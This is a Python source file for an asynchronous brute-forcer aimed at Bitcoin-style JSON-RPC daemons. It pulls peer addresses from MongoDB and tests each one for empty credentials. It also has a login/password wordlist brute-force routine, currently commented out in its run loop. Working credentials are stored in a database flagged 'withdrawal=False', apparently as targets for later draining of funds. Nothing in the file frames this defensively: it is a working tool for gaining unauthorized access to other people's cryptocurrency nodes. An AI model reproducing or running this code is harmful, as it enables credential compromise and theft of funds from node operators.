# -*- coding: utf-8 -*-
import re
import time
import asyncio
import linecache

from collections import namedtuple
from operator import itemgetter

from aiobitcoin.grambitcoin import GramBitcoin
from aiobitcoin.blockchain import Blockchain
from aiobitcoin import bitcoinerrors

from src.extra import utils
from src.extra.pymongodb import PyMongoDB
from src.extra.aiomotor import AIOMotor


class BruterBase:
    _DataCount = namedtuple('DataCount', ['count', 'data'])

    def __init__(self, **kwargs):
        self.mongo_jsonrpc = PyMongoDB(db_name='jsonrpc', uri=kwargs.get('mongo_uri'))
        self.brute_order = kwargs.get('brute_order')
        self.num_threads = kwargs.get('threads')
        self.coin_name = kwargs.get('coin_name')
        self._unordered_data = {
            'H': self.mongo_jsonrpc,
            'L': kwargs.get('logins'),
            'P': kwargs.get('passwords'),
        }

    @staticmethod
    def _prepare_peers(docs):
        return (
            f'{document["peer"]}:{document["jsonrpc"]}'
            for document in docs
        )

    def get_peers_from_db(self, limit):
        documents = self.mongo_jsonrpc.find_many(
            data={'jsonrpc': {'$gt': 0}, 'bruted': False},
            collection=self.coin_name,
            limit=limit,
            to_list=False
        )

        return self._prepare_peers(documents)

    @staticmethod
    def _get_data_from_file(data, start, end):
        start = 1 if start == 0 else start
        return (
            utils.clear_string(linecache.getline(data, line))
            for line in range(start, end)
        )

    def _get_data_block_by_point(self, data, point):
        start, end = point, point + self.num_threads

        if isinstance(data, str):
            genexpr = self._get_data_from_file(data, start, end)
        else:
            genexpr = self.get_peers_from_db(end)

        return genexpr

    def _get_peer_from_db(self):
        params = {
            'data': {'jsonrpc': {'$gt': 0}, 'bruted': False},
            'collection': self.coin_name,
        }

        document = self.mongo_jsonrpc.find_one(**params)
        return f'{document["peer"]}:{document["jsonrpc"]}'

    @staticmethod
    def _get_single_data_from_file(data, point):
        return utils.clear_string(
            linecache.getline(data, point)
        )

    def _get_data_by_point(self, data, point):
        if isinstance(data, str):
            return self._get_single_data_from_file(data, point + 1)
        else:
            return self._get_peer_from_db()

    @property
    def _sorted_brute_order_data(self):
        return [
            self._unordered_data.get(val) for val in self.brute_order
        ]

    def _els_amount_in_data(self, data):
        try:
            count = data.count(
                collection=self.coin_name,
                filter_={'jsonrpc': {'$gt': 0}, 'bruted': False}
            )
        except TypeError:
            count = utils.count_lines(data)

        return self._DataCount(count, data)

    @property
    def _data_counts(self):
        return (
            self._els_amount_in_data(data)
            for data in self._sorted_brute_order_data
        )

    @property
    def brute_data(self):
        first, second, third = self._data_counts

        for i in range(first.count):
            first_val = self._get_data_by_point(first.data, i)

            for j in range(second.count):
                second_val = self._get_data_by_point(second.data, j)

                for k in range(0, third.count, self.num_threads):
                    third_range = self._get_data_block_by_point(third.data, k)
                    yield first_val, second_val, third_range


class EmptyCredentialsChecker(BruterBase):
    _wait_timeout = 10

    def __init__(self, **kwargs):
        super(EmptyCredentialsChecker, self).__init__(**kwargs)
        self._read_timeout = kwargs.get('read_timeout')

        self.async_mongo_creds = AIOMotor(db_name='credentials', uri=kwargs.get('mongo_uri'))
        self.async_mongo_jsonrpc = AIOMotor(db_name='jsonrpc', uri=kwargs.get('mongo_uri'))

    @staticmethod
    async def _get_host_from_uri(uri):
        pattern = re.compile(r'http://(\d+\.){3}\d+')
        return re.search(pattern, uri).group()

    async def _update_brute_status(self, peer, status):
        await self.async_mongo_jsonrpc.update_one(
            find_data={'peer': await self._get_host_from_uri(peer)},
            update_data={'bruted': status},
            collection=self.coin_name
        )

    async def _make_record(self, **kwargs):
        await self.async_mongo_creds.insert_one(
            document=kwargs,
            collection=self.coin_name
        )

    @staticmethod
    async def close_gram_sessions(grams):
        [await gram.close_session() for gram in grams]

    @staticmethod
    async def _get_uri_with_creds(host, login, pwd):
        return f'http://{login}:{pwd}@{host}'

    async def _uri_handler(self, host, login, pwd):
        if login and pwd:
            uri = await self._get_uri_with_creds(host.split('//')[1], login, pwd)
        else:
            uri = host

        return uri

    async def bruteforce(self, host, login=None, password=None, gram=None):
        uri = await self._uri_handler(host, login, password)
        blockchain = Blockchain(url=uri, gram=gram, read_timeout=self._read_timeout)

        try:
            await asyncio.wait_for(blockchain.get_difficulty(), self._wait_timeout)
        except bitcoinerrors.IncorrectCreds:
            pass
        except bitcoinerrors.NoConnectionToTheDaemon:
            await self._update_brute_status(host, 'NoConnectionToTheDaemon')
            raise
        except asyncio.futures.TimeoutError:
            await self._update_brute_status(host, 'TimeoutError')
            raise
        else:
            await self._make_record(uri=uri, withdrawal=False)
            await self._update_brute_status(host, True)

    async def _checker_handler(self, non_checked_peers, grams):
        await asyncio.gather(
            *(self.bruteforce(peer, gram=gram) for peer, gram in zip(non_checked_peers, grams))
        )

    @property
    def _peers_count(self):
        return self.mongo_jsonrpc.count(
            collection=self.coin_name,
            filter_={'jsonrpc': {'$gt': 0}, 'bruted': False}
        )

    async def _run_check_empty_by_block(self, grams):
        for point in range(0, self._peers_count, self.num_threads):
            non_checked_peers = self.get_peers_from_db(self.num_threads)
            await self._checker_handler(non_checked_peers, grams)

        return True

    async def check_peers_with_empty_creds(self):
        grams = [GramBitcoin(session_required=True) for _ in range(self.num_threads)]

        while True:
            try:
                status_without_errs = await self._run_check_empty_by_block(grams)
            except (bitcoinerrors.NoConnectionToTheDaemon, asyncio.futures.TimeoutError):
                continue
            else:
                if status_without_errs:
                    break

        await self.close_gram_sessions(grams)


class JSONRPCBruter(EmptyCredentialsChecker):
    def __init__(self, **kwargs):
        super(JSONRPCBruter, self).__init__(**kwargs)
        self._cycle_timeout = kwargs.get('cycle_timeout')

    def _get_sorted_data(self, data):
        return map(
            lambda x: x[1], sorted(zip(self.brute_order, data), key=itemgetter(0))
        )

    async def _bruteforce_handler(self, args, rng, grams):
        await asyncio.gather(
            *(self.bruteforce(*self._get_sorted_data((*args, val)), gram)
              for val, gram in zip(rng, grams))
        )

    async def _run_bruteforce_by_block(self, grams):
        for *args, rng in self.brute_data:
            await self._bruteforce_handler(args, rng=rng, grams=grams)

    async def run_bruteforce(self):
        while True:
            await self.check_peers_with_empty_creds()
            # grams = [GramBitcoin(session_required=True) for _ in range(self.num_threads)]
            #
            # try:
            #     await self._run_bruteforce_by_block(grams)
            # except (bitcoinerrors.NoConnectionToTheDaemon, asyncio.futures.TimeoutError):
            #     continue
            # finally:
            #     await self.close_gram_sessions(grams)
            #     time.sleep(self._cycle_timeout)
            break
